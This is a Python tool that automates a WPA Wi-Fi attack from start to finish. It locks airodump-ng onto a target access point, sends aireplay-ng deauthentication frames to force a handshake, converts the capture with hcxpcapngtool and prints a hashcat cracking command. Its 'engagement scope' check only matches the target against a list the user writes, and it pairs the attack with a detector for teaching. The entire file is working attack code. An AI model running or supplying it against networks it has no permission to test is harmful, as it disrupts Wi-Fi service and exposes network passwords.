#!/usr/bin/env python3
"""
Scoped offensive wireless operations for authorized engagements.

Design: industry-standard stack underneath (airodump-ng, aireplay-ng,
hcxpcapngtool, hashcat), your twist on top. The twist is three things a raw tool
does not give you:

  1. Scope discipline   -- an op refuses any BSSID outside your declared
                           engagement scope (same gate as active_mitigation).
  2. It teaches you      -- every step prints the exact standard command it runs
                           with a one-line "why", so you learn and master the
                           underlying tools instead of hiding behind a wrapper.
  3. The purple mirror   -- it tells you what your own detector (da_bklyn_bridge)
                           would see, so you run the attack and the defense as
                           one loop. You own both halves.

These are orchestration wrappers; they do not reimplement the standard tools.
The scope and command logic is unit-tested (tests/test_wireless_ops.py). Live
execution needs the tool installed and authorized hardware on an in-scope target.

Ops: capture (scoped WPA handshake/PMKID -> hashcat 22000).
"""

import argparse
import os
import shutil
import subprocess
import sys
import time
from pathlib import Path


# ---- engagement scope -----------------------------------------------------
def load_scope(scope_file=None, config_path=None):
    """Authorized target BSSIDs, from a --scope file and/or config.yaml."""
    bssids = set()
    if scope_file:
        try:
            with open(scope_file, encoding="utf-8") as fh:
                for raw in fh:
                    line = raw.split("#", 1)[0].strip()
                    if line:
                        bssids.add(line.upper())
        except OSError as e:
            raise SystemExit(f"[!] cannot read scope file {scope_file}: {e}")
    if config_path and os.path.exists(config_path):
        try:
            import yaml
            cfg = yaml.safe_load(open(config_path)) or {}
            am = cfg.get("active_mitigation", {}) or {}
            for b in (am.get("scope_bssids") or am.get("allowed_bssids") or []):
                if isinstance(b, str):
                    bssids.add(b.upper())
        except Exception:
            pass
    return bssids


def require_scope(bssid, scope):
    bssid = bssid.upper()
    if bssid not in scope:
        raise SystemExit(
            f"[!] {bssid} is not in the engagement scope ({len(scope)} authorized). "
            "Refusing. Add it to your ROE scope first."
        )
    return bssid


def require_tool(tool):
    if not shutil.which(tool):
        raise SystemExit(f"[!] required tool '{tool}' not found. Install it (apt install {tool}).")


# ---- teaching layer: show the real command and why ------------------------
def step(n, why, cmd, run=True, background=False):
    """Print the industry-standard command and a one-line why, then run it."""
    print(f"\n[{n}] {why}")
    print("    $ " + " ".join(str(c) for c in cmd))
    if not run:
        return None
    if background:
        return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)


# ---- command builders (pure, unit-tested) ---------------------------------
def airodump_cmd(interface, bssid, channel, prefix):
    return ["airodump-ng", "-c", str(channel), "--bssid", bssid.upper(),
            "-w", prefix, "--output-format", "pcap", interface]


def deauth_cmd(interface, bssid, count, client=None):
    cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid.upper()]
    if client and client.upper() != "FF:FF:FF:FF:FF:FF":
        cmd += ["-c", client.upper()]
    cmd.append(interface)
    return cmd


def convert_cmd(capfile, out_22000):
    return ["hcxpcapngtool", "-o", out_22000, capfile]


def crack_hint(out_22000, wordlist="/usr/share/wordlists/rockyou.txt"):
    return ["hashcat", "-m", "22000", out_22000, wordlist]


# ---- capture: scoped handshake/PMKID -> .22000 ----------------------------
def capture_handshake(interface, bssid, channel, scope, outdir=".",
                      seconds=45, deauth_rounds=3, client="FF:FF:FF:FF:FF:FF"):
    """Scoped WPA handshake/PMKID capture, taught step by step."""
    bssid = require_scope(bssid, scope)
    for t in ("airodump-ng", "hcxpcapngtool"):
        require_tool(t)

    Path(outdir).mkdir(parents=True, exist_ok=True)
    prefix = str(Path(outdir) / f"capture_{bssid.replace(':', '')}")
    cap, out_22000 = prefix + "-01.cap", prefix + ".22000"

    print(f"=== scoped handshake capture: {bssid} ch {channel} (authorized) ===")
    dump = step(1, "lock airodump-ng to the one in-scope AP and record to a pcap",
                airodump_cmd(interface, bssid, channel, prefix), background=True)
    try:
        if deauth_rounds > 0:
            require_tool("aireplay-ng")
            time.sleep(min(5, seconds))
            step(2, "bump a client so it reassociates and emits the 4-way handshake",
                 deauth_cmd(interface, bssid, deauth_rounds, client))
        time.sleep(max(0, seconds - (min(5, seconds) if deauth_rounds > 0 else 0)))
    finally:
        dump.terminate()
        try:
            dump.wait(timeout=5)
        except subprocess.TimeoutExpired:
            dump.kill()

    if not os.path.exists(cap):
        print("\n[!] no capture file written; nothing captured.")
        return None
    step(3, "normalize the capture into a hashcat-ready hash (22000 format)",
         convert_cmd(cap, out_22000))

    print("\n--- your twist ---")
    if os.path.exists(out_22000) and os.path.getsize(out_22000) > 0:
        print(f"[+] hash ready: {out_22000}")
        print("[next] crack it (the standard move you now run yourself):")
        print("    $ " + " ".join(crack_hint(out_22000)))
        print("    then rules -> combinator -> OSINT lists -> GPU, per the playbook tiers.")
    else:
        print("[!] no handshake/PMKID yet. Target idle; re-run or raise --deauth.")
    print("[blue mirror] that deauth is loud. da_bklyn_bridge would flag it as a")
    print("    DEAUTH_ATTACK. You just ran the attack; your own sensor sees it. Both halves.")
    return out_22000 if os.path.exists(out_22000) and os.path.getsize(out_22000) > 0 else None


def main():
    p = argparse.ArgumentParser(description="Scoped offensive wireless operations (authorized engagements only)")
    sub = p.add_subparsers(dest="op", required=True)
    cap = sub.add_parser("capture", help="Scoped WPA handshake/PMKID capture -> .22000")
    cap.add_argument("-i", "--interface", required=True)
    cap.add_argument("-b", "--bssid", required=True, help="target BSSID (must be in scope)")
    cap.add_argument("-c", "--channel", required=True)
    cap.add_argument("--scope", help="engagement scope file (one BSSID per line)")
    cap.add_argument("--config", help="config.yaml with active_mitigation.scope_bssids")
    cap.add_argument("--outdir", default=".")
    cap.add_argument("--seconds", type=int, default=45)
    cap.add_argument("--deauth", type=int, default=3, help="deauth rounds (0 = passive)")
    cap.add_argument("--client", default="FF:FF:FF:FF:FF:FF")

    args = p.parse_args()
    if args.op == "capture":
        scope = load_scope(args.scope, args.config)
        if not scope:
            raise SystemExit("[!] no engagement scope. Pass --scope or set active_mitigation.scope_bssids.")
        capture_handshake(args.interface, args.bssid, args.channel, scope,
                          outdir=args.outdir, seconds=args.seconds,
                          deauth_rounds=args.deauth, client=args.client)


if __name__ == "__main__":
    main()
